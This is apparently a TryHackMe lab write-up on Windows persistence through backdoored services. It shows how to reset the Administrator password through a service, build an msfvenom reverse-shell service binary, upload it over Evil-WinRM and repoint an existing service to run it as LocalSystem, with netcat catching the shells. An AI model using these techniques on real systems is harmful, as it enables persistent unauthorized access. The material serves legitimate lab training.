### Backdoor Services
We are going to reset our Admin password (note this will nuke our Evil-WinRM session)
```
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto

sc.exe start THMservice
```

Create a Rev Shell service
```bash
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/win_local_pers/backdoor_services]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.93.71 LPORT=4445 -f exe-service -o rev-svc.exe
```

Create the Service and upload the executable
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload rev-svc.exe C:\Windows\rev-svc.exe
                                        
Info: Uploading /home/sstephens/Documents/tryhackme/win_local_pers/backdoor_services/rev-svc.exe to C:\Windows\rev-svc.exe                                                                                                              
                                        
Data: 64852 bytes of 64852 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\Administrator\Documents> sc.exe start THMservice2

SERVICE_NAME: THMservice2
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 4900
        FLAGS              :
*Evil-WinRM* PS C:\Users\Administrator\Documents> sc.exe stop THMservice2
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\Administrator\Documents> sc.exe start THMservice2

SERVICE_NAME: THMservice2
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3212
        FLAGS              :
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

We should now have a rev shell on our kali box
```bash
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/win_local_pers/backdoor_services]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.226.174] 50006
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> C:\flags\flag7.exe

C:\flags\flag7.exe
THM{SUSPICIOUS_SERVICES}
```

### Modify Existing Service
The lab has a persistence-able service already stopped for us
``` powershell
sc.exe query state=all

sc.exe qc THMService3


[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

```powershell
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc.exe" start= auto obj= "LocalSystem"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\Administrator\Documents> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

```bash
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/win_local_pers/backdoor_services]
└─$ nc -lvnp 4445                                                                                        
listening on [any] 4445 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.226.174] 50014
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\flags\flag8.exe
C:\flags\flag8.exe
THM{IN_PLAIN_SIGHT}

```